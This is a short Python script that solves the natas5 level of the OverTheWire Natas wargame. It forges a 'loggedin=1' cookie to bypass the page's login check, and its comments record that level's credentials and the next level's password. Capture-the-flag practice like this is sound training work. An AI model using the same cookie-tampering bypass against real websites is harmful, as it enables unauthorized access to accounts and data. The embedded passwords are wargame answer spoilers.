import requests,re


username="natas5"
password="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url=str("http://%s.natas.labs.overthewire.org" %username)

r=requests.get(url,auth=(username,password))

print(r.cookies)
#<RequestsCookieJar[<Cookie loggedin=0 for natas5.natas.labs.overthewire.org/>]>

cookie={'loggedin':'1'}
r=requests.get(url,auth=(username,password),cookies=cookie)

print(r.text)

#Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>